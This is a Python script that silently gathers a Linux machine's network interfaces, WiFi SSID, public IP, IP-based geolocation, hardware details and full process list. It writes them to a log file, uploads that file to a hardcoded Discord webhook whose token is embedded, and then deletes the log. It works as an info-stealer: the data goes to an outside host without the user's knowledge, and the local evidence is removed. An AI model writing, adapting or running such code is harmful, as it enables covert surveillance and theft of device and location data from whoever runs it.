import subprocess
import requests
import json
import netifaces
import platform
import socket
import os

# Discord Webhook URL
webhook_url = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA'

# Function to send message to Discord webhook
def send_to_discord(file_path):
    with open(file_path, 'rb') as f:
        payload = {
            'payload_json': json.dumps({
                'content': 'Hier ist die log.txt mit den gesammelten Daten:'
            })
        }
        files = {
            'file': f
        }
        response = requests.post(webhook_url, data=payload, files=files)
        if response.status_code == 204:
            print("File sent successfully to Discord webhook.")
        else:
            print(f"Failed to send file to Discord webhook. Status code: {response.status_code}")
            print(f"Response: {response.text}")

# Function to execute command and capture output
def execute_command(command):
    result = subprocess.run(command, capture_output=True, text=True, shell=True)
    return result.stdout.strip()

# Function to get detailed network information
def get_network_info():
    interfaces = netifaces.interfaces()
    network_info = {}

    for iface in interfaces:
        addrs = netifaces.ifaddresses(iface)
        info = {}
        if netifaces.AF_INET in addrs:
            info['IPv4'] = addrs[netifaces.AF_INET]
        if netifaces.AF_INET6 in addrs:
            info['IPv6'] = addrs[netifaces.AF_INET6]
        network_info[iface] = info
    
    return network_info

# Function to get SSID and additional network details
def get_wifi_details():
    ssid = execute_command('iwgetid -r')
    signal_strength = execute_command('iwconfig 2>&1 | grep Signal | awk \'{print $4}\' | cut -d "=" -f 2')
    frequency = execute_command("iwlist frequency | grep Current | awk '{print $2, $3}'")
    bit_rate = execute_command("iwlist bitrate | grep Current | awk '{print $2, $3}'")

    return {
        'ssid': ssid,
        'signal_strength': signal_strength,
        'frequency': frequency,
        'bit_rate': bit_rate
    }

# Function to get public IP address
def get_public_ip():
    ip = execute_command('curl -s https://api64.ipify.org')
    return ip

# Function to get location information based on public IP
def get_location_info(public_ip):
    response = requests.get(f'https://ipinfo.io/{public_ip}/json')
    if response.status_code == 200:
        location_info = response.json()
    else:
        location_info = {'error': 'Could not retrieve location information'}

    return location_info

# Function to get device information
def get_device_info():
    device_info = {
        'hostname': socket.gethostname(),
        'platform': platform.system(),
        'platform_release': platform.release(),
        'platform_version': platform.version(),
        'architecture': platform.machine(),
        'processor': platform.processor(),
        'device_name': platform.node(),
        'python_version': platform.python_version(),
    }
    return device_info

# Function to get storage information
def get_storage_info():
    storage_info = execute_command('df -h')
    return storage_info

# Function to get memory information
def get_memory_info():
    memory_info = execute_command('free -h')
    return memory_info

# Function to get CPU information
def get_cpu_info():
    cpu_info = execute_command('lscpu')
    return cpu_info

# Function to get running processes
def get_running_processes():
    processes = execute_command('ps aux')
    return processes

# Collect detailed network, WiFi, and device information
network_info = get_network_info()
wifi_details = get_wifi_details()
public_ip = get_public_ip()
location_info = get_location_info(public_ip)
device_info = get_device_info()
storage_info = get_storage_info()
memory_info = get_memory_info()
cpu_info = get_cpu_info()
running_processes = get_running_processes()

# Write collected information to log.txt
log_file_path = 'log.txt'
with open(log_file_path, 'w') as f:
    f.write("=== Device Information ===\n")
    for key, value in device_info.items():
        f.write(f"{key.capitalize()}: {value}\n")
    f.write("\n")

    f.write("=== Network Information ===\n")
    for iface, info in network_info.items():
        f.write(f"Interface: {iface}\n")
        if 'IPv4' in info:
            for addr in info['IPv4']:
                f.write(f"IPv4 Address: {addr['addr']}\n")
                f.write(f"Netmask: {addr['netmask']}\n")
        if 'IPv6' in info:
            for addr in info['IPv6']:
                f.write(f"IPv6 Address: {addr['addr']}\n")
                f.write(f"Netmask: {addr.get('netmask', 'N/A')}\n")
        f.write("\n")

    f.write("=== WiFi Details ===\n")
    f.write(f"SSID: {wifi_details['ssid']}\n")
    f.write(f"Signal Strength: {wifi_details['signal_strength']} dBm\n")
    f.write(f"Frequency: {wifi_details['frequency']}\n")
    f.write(f"Bit Rate: {wifi_details['bit_rate']}\n")
    f.write("\n")

    f.write("=== Public IP and Location ===\n")
    f.write(f"Public IP Address: {public_ip}\n")
    if 'error' in location_info:
        f.write(f"Location Information: {location_info['error']}\n")
    else:
        for key, value in location_info.items():
            f.write(f"{key.capitalize()}: {value}\n")
    f.write("\n")

    f.write("=== Storage Information ===\n")
    f.write(f"{storage_info}\n")

    f.write("=== Memory Information ===\n")
    f.write(f"{memory_info}\n")

    f.write("=== CPU Information ===\n")
    f.write(f"{cpu_info}\n")

    f.write("=== Running Processes ===\n")
    f.write(f"{running_processes}\n")

# Send log.txt content to Discord webhook
send_to_discord(log_file_path)

# Delete log.txt after sending
os.remove(log_file_path)
